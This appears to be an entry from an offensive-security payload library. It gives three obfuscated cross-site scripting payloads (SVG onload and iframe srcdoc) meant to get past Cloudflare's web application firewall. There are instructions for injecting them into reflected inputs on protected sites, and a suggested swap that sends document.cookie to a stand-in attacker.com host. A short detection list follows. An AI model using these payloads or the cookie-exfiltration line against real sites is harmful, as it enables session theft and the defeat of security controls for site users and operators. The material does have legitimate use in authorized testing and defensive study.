---
id: 7e9c2d4e-81a7-4bc7-9f7e-127451ad0803
name: Cloudflare-XSS-Bypass-SVG-Prompt-Payload
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:56:43.391989+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss
  - waf-bypass
  - cloudflare
  - payload
platforms:
  - Web
validated: true
---

# Cloudflare-XSS-Bypass-SVG-Prompt-Payload

## Code

```html
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

## Description

This HTML code snippet contains three obfuscated XSS payloads designed to bypass Cloudflare WAF protections. The first two use SVG elements with onload attributes that encode the prompt function to display the document domain, evading keyword-based filters. The third uses an iframe with srcdoc to embed a script tag executing the prompt via template literals. These are injected into vulnerable reflected XSS points to confirm exploitation without triggering defenses.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This payload has no variables; it is self-contained and uses the current document context. | N/A |

## Usage

Inject these payloads into URL parameters, form fields, or other reflected inputs on Cloudflare-protected sites. For example, append to a search query: https://target.com/search?q=<svg onload=prompt%26%230000000040document.domain)>. Use a proxy like Burp Suite to encode/decode as needed. In red team scenarios, replace 'prompt`document.domain`' with payloads for cookie exfiltration (e.g., new Image().src='http://attacker.com?cookie='+document.cookie).

## Detection

- WAF logs showing blocked SVG or iframe tags with onload/srcdoc attributes.
- Browser console errors or anomalous prompts revealing domains.
- Network monitoring for unexpected JS execution in reflected content.
- Content Security Policy violations if CSP is enforced.

## Related

- [[procedures/Bypass-Cloudflare-XSS-Protection-with-Obfuscated-Prompt-Payloads]]
